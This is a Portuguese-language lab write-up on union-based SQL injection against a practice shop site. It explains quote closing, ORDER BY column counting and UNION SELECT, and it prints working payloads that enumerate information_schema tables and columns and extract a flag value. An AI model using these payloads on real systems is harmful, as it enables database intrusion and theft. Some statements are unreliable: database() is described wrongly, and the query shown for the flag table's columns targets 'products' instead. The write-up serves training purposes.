
Essa falha ocorre porque temos um input que é concatenado diretamente em uma query sql, sem ser sanitizado, ou seja, ele aceita todos os caracteres, ou ainda aceita "caracteres maliciosos", o que nós permite editarmos as queries para trazer os resultados que nós queremos.

Algumas estrategias são utilizar o order by para que nós descobrissemos quantas colunas estão sendo utilizadas naquela query.

Podemos fechar queries, com ', e então apos injetar nosso comando comentar todo o restante, com #, ou -- -, os dois funcionam.

Também podemos utilizar o union select, para que possamos realizar outra pesquisa junto da que o desenvolvedor já estipulou. 


Alguns comando importantes são: 

@@version -> Mostra a versão do banco de dados utilizado

database() -> Mostra todos os bancos que existem na maquina

information_schema.tables -> Mostra todas as tabelas de todos os bancos de dados cadastrados na maquina

information_schema.columns -> Mostra todas as colunas de todos os bancos de dados cadastrados na maquina

table_schema -> Mostra nome do db atual

user() -> Mostra o usuario logado para comunicação com o bando



<h1>Laboratório</h1>
No laboratório temos uma loja com 3 produtos, um wifi-pineapple, um usb rubber duck, e um bash bunny, temos um campo de pesquisa para procurar por eles, ou por algo na descrição, com isso podemos fechar a query, com ', e então testar para tentarmos achar quantas colunas estão sendo utilizadas, com o order by.
Fazendo isso conseguimos ver que temos 4 colunas, pois se tentarmos com 5, ele não retorna nenhum item. Então vamos entender onde estão os valores utilizando o union select

Com isso podemos perceber que, o numero 2, e o 3 são respectivamente, o nome do produto, e a descrição, com isso podemos alterar coisas para que conseguissemos extrair dados do banco, como o nome das tabelas, os nomes do bancos de dados, o nome das colunas, entre outros.

Nome do banco: cs -> 
versão: 10.5.11-MariaDB-1 -> 
usuário: webapp@localhost ->

tabelas: products and flag -> ' or 1=1 union select 1,2,table_name,4 from information_schema.tables where table_schema="cs"; #

colunas da tabela products: id, name, description, price -> ' or 1=1 union select 1,2,column_name,4 from information_schema.columns where table_schema="cs" and table_name="products"; #

colunas da tabela flag: id, name -> ' or 1=1 union select 1,2,column_name,4 from information_schema.columns where table_schema="cs" and table_name="products"; #

valor de name da tabela flag -> ' or 1=1 union select 1,2,name,4 from flag; #